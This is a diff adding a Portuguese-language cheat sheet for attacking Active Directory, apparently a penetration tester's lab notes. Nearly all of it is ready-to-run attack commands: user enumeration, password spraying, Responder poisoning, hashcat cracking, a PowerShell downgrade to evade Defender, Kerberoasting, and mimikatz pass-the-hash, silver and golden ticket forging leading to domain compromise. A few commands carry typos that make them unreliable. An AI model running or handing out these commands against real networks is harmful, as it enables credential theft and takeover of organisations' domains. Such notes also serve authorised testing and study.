@@ -1,0 +1,664 @@
+# Estratégia para Ataques ao Active Directory
+
+https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+
+# Binarios pré compilados:
+
+https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
+
+1 - Enumerar usuários com kerbrute, LDAP, enum4linux, responder;
+
+2 - Conseguir password policy com enum4linux; LDAP;
+
+3 - Fazer password spray com worldlist ou senhas comuns;
+
+4 - Se possuir usuário com low priv, fica mais fácil de conseguir as informações acima;
+
+5 - Extrair informações com bloodhound e verificar as permissões, SPNs e verificar se existem arquivos acessiveis no diretório do DC (SYSVOL/NETLOGON)
+
+6 - Com usuário de baixo privilegio, enumerar usuarios com crackmapexec e fazer password spray;
+
+7 - Enumerar SPNs;
+
+8 - Caso tenha NT-System, procurar por hashes com mimikatz;
+
+9 - Testar hashes em diferentes usuários e verificar se é possível acessar outras máquinas;
+
+10 - Verificar DAC e ACLs com permissões que permitiam modificar outros usuários;
+
+11 - Verificar por contas com DCSync;
+
+12 - DCSync e domain compromise;
+
+# Swissky AD- Attacks
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
+
+# Tib3rius - Cheatsheet
+
+https://github.com/Tib3rius/Active-Directory-Exploitation-Cheat-Sheet
+
+# Coleta de informações de DNS, BGP e ping
+# Ferramentas para enumeração de DNS e BGP
+
+https://whois.domaintools.com/inlanefreight.com
+
+http://he.net/
+
+https://viewdns.info/
+
+https://fping.org/
+
+# Responder
+# Ferramenta para coleta de LLMNR, NBT-NS, e MDNS
+
+sudo responder -I ens224 -A
+
+# Comando para quebrar hashes NTLM
+
+hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
+
+# Mesma funcionalidade do Responder porém para hosts Windows
+
+https://github.com/Kevin-Robertson/Inveigh
+
+Import-Module .\Inveigh.ps1
+
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+# Enumerando usuários
+# Comando para fazer bruteforce de usuários, essa lista foi tirada do repo abaixo
+
+https://github.com/insidetrust/statistically-likely-usernames
+
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc <SERVER IP> jsmith.txt -o valid_ad_users
+
+# Enumerando com LDAP
+
+ldapsearch -h <SERVER IP> -x -b "DC=<DOMAIN>,DC=<COM>" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
+
+# Enumerando usuários com enum4linux
+
+enum4linux -U <SERVER IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+
+# Com crackmapexec autenticado e N-autenticado e grupos
+
+crackmapexec smb <SERVER IP> --users
+
+crackmapexec smb <SERVER IP> -u <USERNAME> -p <PASSWORD> --users
+
+crackmapexec smb <SERVER IP> -u <USERNAME> -p <PASSWORD> --groups
+
+# Através de um usuário autenticado conseguimos enumerar usuários logados em determinado host
+
+crackmapexec smb <SERVER IP> -u <USERNAME> -p <PASSWORD> --loggedon-users
+
+# Também é possível enumerar diretórios e o nível de acesso que temos em computadores remotos
+
+crackmapexec smb <SERVER IP> -u <USERNAME> -p <PASSWORD> --shares
+
+# Com o module Spider_plus o CME vai procurar por arquivos dentro dos diretórios encontrados
+
+crackmapexec smb <SERVER IP> -u <USERNAME> -p <PASSWORD> -M spider_plus --share 'Department Shares'
+
+# Alternativamente podemos utilizar smbmap
+
+smbmap -u <USERNAME> -p <PASSWORD> -d DOMAIN.COM -H <SERVER IP>
+
+smbmap <USERNAME> -p <PASSWORD> -d DOMAIN.COM -H <SERVER IP> -R 'Department Shares' --dir-only
+
+# Outra opção é o Windapsearch
+
+python3 windapsearch.py --dc-ip <SERVER IP> -u USER@DOMAIN.COM -p <PASSWORD> --da
+
+python3 windapsearch.py --dc-ip <SERVER IP> -u USER@DOMAIN.COM -p <PASSWORD> -PU
+
+# Ferramenta interessante para enumerar shares no dominio
+
+Snaffler.exe -s -d DOAMAIN.COM -o snaffler.log -v data
+
+# Enumerando usuários com PowerView
+
+Import-Module .\PowerView.ps1
+
+# Append results to a CSV file
+
+Export-PowerViewCSV
+
+# Convert a User or group name to its SID value
+
+ConvertTo-SID
+
+# Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
+
+Get-DomainSPNTicket
+
+# Will return the AD object for the current (or specified) domain
+
+Get-Domain
+
+# Return a list of the Domain Controllers for the specified domain
+
+Get-DomainController
+
+# Will return all users or specific user objects in AD
+
+Get-DomainUser
+
+# Will return all computers or specific computer objects in AD
+
+Get-DomainComputer
+
+# Will return all groups or specific group objects in AD
+
+Get-DomainGroup
+
+# Search for all or specific OU objects in AD
+
+Get-DomainOU
+
+# Finds object ACLs in the domain with modification rights set to non-built in objects
+
+Find-InterestingDomainAcl
+
+# Will return the members of a specific domain group
+
+Get-DomainGroupMember
+
+# Returns a list of servers likely functioning as file servers
+
+Get-DomainFileServer
+
+# Returns a list of all distributed file systems for the current (or specified) domain
+
+Get-DomainDFSShare
+
+# Will return all GPOs or specific GPO objects in AD
+
+Get-DomainGPO
+
+# Returns the default domain policy or the domain controller policy for the current domain
+
+Get-DomainPolicy
+
+# Enumerates local groups on the local or a remote machine
+
+Get-NetLocalGroup
+
+# Enumerates members of a specific local group
+
+Get-NetLocalGroupMember
+
+# Returns open shares on the local (or a remote) machine
+
+Get-NetShare
+
+# Will return session information for the local (or a remote) machine
+
+Get-NetSession
+
+# Tests if the current user has administrative access to the local (or a remote) machine
+
+Test-AdminAccess
+
+# Finds machines where specific users are logged in
+
+Find-DomainUserLocation
+
+# Finds reachable shares on domain machines
+
+Find-DomainShare
+
+# Searches for files matching specific criteria on readable shares in the domain
+
+Find-InterestingDomainShareFile
+
+# Find machines on the local domain where the current user has local administrator access
+
+Find-LocalAdminAccess
+
+# Returns domain trusts for the current domain or a specified domain
+
+Get-DomainTrust
+
+# Returns all forest trusts for the current forest or a specified forest
+
+Get-ForestTrust
+
+# Enumerates users who are in groups outside of the user's domain
+
+Get-DomainForeignUser
+
+# Enumerates groups with users outside of the group's domain and returns each foreign member
+
+Get-DomainForeignGroupMember
+
+# Will enumerate all trusts for the current domain and any others seen.
+
+Get-DomainTrustMapping
+
+# Coletando informações de um usuário
+
+Get-DomainUser -Identity mmorgan -Domain DOMAIN.COM | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+
+# Coletando informações de um grupo recursivamente
+
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+# Testando acesso admin localmente
+
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+
+# Procurando por SPNs
+
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+
+# Enumerando password policy
+
+# Autenticado
+
+crackmapexec smb <SERVER IP> -u <USERNAME> -p <PASSWORD> --pass-pol
+
+# Não autenticado
+
+rpcclient -U "" -N <SERVER IP>
+
+querydominfo
+
+# Com enum4linux
+
+enum4linux -P <SERVER IP>
+
+# Enumerando via LDAP
+
+ldapsearch -h <SERVER IP> -x -b "DC=DOMAIN,DC=COM" -s sub "*"
+
+# Password Spraying
+
+# Bash oneliner para password spray
+
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <SERVER IP> | grep Authority; done
+
+# Realizando password Spray com crackmapexec
+
+crackmapexec smb <SERVER IP> -u valid_users.txt -p -p <PASSWORD> | grep +
+
+crackmapexec smb <SERVER IP> -u <USERNAME> -p <PASSWORD>
+
+# Password Spray em maquinas Windows
+
+https://github.com/dafthack/DomainPasswordSpray
+
+Import-Module .\DomainPasswordSpray.ps1
+
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+
+# Password Reuse 
+# Muito importante, as vezes o mesmo password pode ser utilizado em contas diferentes, sempre importante testar.
+# Testar password localmente
+
+crackmapexec smb --local-auth <NET RANGE> -u <USERNAME> -H <NTLM HASH> | grep +
+
+# Trabalhando em ambientes restringidos
+# Comando para verificar status do defender
+
+Get-MpComputerStatus
+
+# Para verificar bloqueios de AppLocker
+
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# Nesse caso poderiamos executar o powershell através de outro local como
+
+%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+
+ou
+
+PowerShell_ISE.exe
+
+# Comando para verificar Full Language Mode ou Constrained Language Mode
+
+$ExecutionContext.SessionState.LanguageMode
+
+# Comando para encontrar usuários com privilégios LAPS
+
+Find-LAPSDelegatedGroups
+
+Find-AdmPwdExtendedRights
+
+Get-LAPSComputers
+
+# Prints the PC's Name
+
+hostname
+
+# Prints out the OS version and revision level
+
+[System.Environment]::OSVersion.Version
+
+# Prints the patches and hotfixes applied to the host
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+# Prints out network adapter state and configurations
+
+ipconfig /all
+
+# Displays the domain name to which the host belongs (ran from CMD-prompt)
+
+set %USERDOMAIN%
+
+# Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
+
+set %logonserver%
+
+# Informações do sistema
+
+systeminfo
+
+# Pega o histórico do powershell do usuário
+
+Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+
+# Fazer downgrade do powershell para dar bypass no defender
+
+Get-host
+
+powershell.exe -version 2
+
+get-module
+
+# Checar informações do FW via Powershell e CMD
+
+netsh advfirewall show allprofiles
+
+sc query windefend
+
+# Verificar usuários logados
+
+qwinsta
+
+# Displays basic host information to include any attributes within the list
+
+wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
+
+# A listing of all processes on host
+
+wmic process list /format:list
+
+# Displays information about the Domain and Domain Controllers
+
+wmic ntdomain list /format:list
+
+# Displays information about all local accounts and any domain accounts that have logged
+
+wmic useraccount list /format:listinto the device
+
+# Information about all local groups
+
+wmic group list /format:list
+
+# Dumps information about any system accounts that are being used as service accounts.
+
+wmic sysaccount list /format:list
+
+# Information about password requirements
+
+net accounts
+
+# Password and lockout policy
+
+net accounts /domain
+
+# Information about domain groups
+
+net group /domain
+
+# List users with domain admin privileges
+
+net group "Domain Admins" /domain
+
+# List of PCs connected to the domain
+
+net group "domain computers" /domain
+
+# List PC accounts of domains controllers
+
+net group "Domain Controllers" /domain
+
+# User that belongs to the group
+
+net group <domain_group_name> /domain
+
+# List of domain groups
+
+net groups /domain
+
+# All available groups
+
+net localgroup
+
+# List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
+
+net localgroup administrators /domain
+
+# Information about a group (admins)
+
+net localgroup Administrators
+
+# Add user to administrators
+
+net localgroup administrators [username] /add
+
+# Check current shares
+
+net share
+
+# Get information about a user within the domain
+
+net user <ACCOUNT_NAME> /domain
+
+# List all users of the domain
+
+net user /domain
+
+# Information about the current user
+
+net user %username%
+
+# Mount the share locally
+
+net use x: \computer\share
+
+# Get a list of computers
+
+net view
+
+# Shares on the domains
+
+net view /all /domain[:domainname]
+
+# List shares of a computer
+
+net view \computer /ALL
+
+# List of PCs of the domain
+
+net view /domain
+
+# Enumerando via windows
+
+net accounts
+
+# Enumerando via PowerView
+
+import-module .\PowerView.ps1
+
+Get-DomainPolicy
+
+# Coleta de usuários
+# Repositório de possiveis usuários Enterprise
+
+https://github.com/insidetrust/statistically-likely-usernames
+
+# Ferramenta para coletar usuários do Linkedin
+
+https://github.com/initstring/linkedin2username
+
+# Password Spray escrito em Powershell, muito bom para quando já temos acesso ao domínio
+
+https://github.com/dafthack/DomainPasswordSpray
+
+# Enumerar usuários locais com net user
+
+net user
+
+# Usuários do domínio
+
+net user /domain
+
+# Consultar informações de um usuário do domínio
+
+net user <user> /domain
+
+# Enumerar grupos do dominino
+
+net group /domain
+
+#Encontrando hostname e Distinguished name
+
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# Enumerando usuários com ActiveDirectory powershell
+
+Import-Module ActiveDirectory
+
+Get-Module
+
+Get-ADDomain
+
+# Verificando relacionamentos de confiança
+
+Get-ADTrust -Filter *
+
+Get-ADGroup -Filter * | select name
+
+Get-ADGroup -Identity "Backup Operators"
+
+Get-ADGroupMember -Identity "Backup Operators"
+
+# Enumerando usuários logados
+
+#PowerView é utilizado para enumerar usuários logados em WorkStations e Servidores
+
+Import-Module .\PowerView.ps1
+
+Get-NetLoggedon -ComputerName <Nome da Máquina>
+
+# Comando utilizado para verificar usuários logados no domain controller
+
+Get-NetSession -ComputerName dc01
+
+# Enumerando SPNs com Powershell
+
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.',',DC='))"
+$SearchString += $DistinguishedName
+$SearchString
+
+# Enumerar usuarios via LDAP
+
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+
+# A linha abaixo é utilizada como fitlro, é possível procurar qualquer SPN
+$Searcher.filter="serviceprincipalname=*http*"
+$Result = $Seacher.FindAll()
+Foreach($obj in $Result)
+{
+    Foreach($prop in $obj.Properties)
+    {
+        $prop
+    }
+}
+
+# Extraindo SPNs manualmente
+# Necessário ter o Mimikatz na máquina.
+# Comando executado via powershell
+
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.kerberosResquestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+klist
+
+# Com mimikatz, irá fazer o download em disco
+
+mimikatz# kerberos::list /export
+
+# No kali, podemos tentar quebrar o hash
+
+sudo apt update && sudo apt install kerberoast
+
+python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt /path-to-file /keberoast-acc.kirbi
+
+# Overpass the Hash com Mimikatz
+# Para esse ataque dar certo é preciso ter algum hash cached na máquina
+# Basicamente iremos usar um NTLM hash para gerar um Keberos ticket
+
+mimikatz# sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:<NTLM HASH> /run:Powershell.exe
+
+#Powershell
+klist
+net use \\dc01
+klist
+.\psexec.exe \\dc01 cmd.exe
+whoami
+
+# Criando Silver Ticket
+# Primeiro é necessário extrair o domain SID
+
+whoami /user
+mimikatz# kerberos::purge
+mimikatz# kerberos::list
+mimikatz# kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-................ /target:<SPN-ACC> /service:HTTP /rc4:<HASH> /ptt
+mimikatz# kerberos::list
+
+# Criando Golden Ticket
+# Para funcionar, precisa ter o hash da conta krgbt
+
+mimikatz# privilege::debug
+mimikatz# kerberos::purge
+mimikatz# kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-.................. /krbtgt:<HASH-rc4_hmac_nt> /ptt
+mimikatz# misc::cmd
+
+# CMD
+psexec.exe \\dc01 cmd.exe
+
+# Explorando SPNs
+# Coletando via Windows com PowerView
+
+Import-Module .\PowerView.ps1
+
+Get-DomainUser -SPN -Properties samaccountname,
+
+PrincipalName
+
+Get-DomainUser -Identity sqlServer | Get-DomainSPNTicket -Format Hashcat
+
+# Coletando SPN com setspn essa ferramenta é default do Windows. Essa forma de conseguir SPNs é interessante em casos que não conseguimos fazer upload de ferramentas no host.
+
+setspn.exe -Q */*
+
+# Powershell
+
+Add-Type -AssemblyName System.IdentityModel
+
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+
+mimikatz # kerberos::list /export
+python2.7 kirbi2john.py sqldev.kirbi
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+
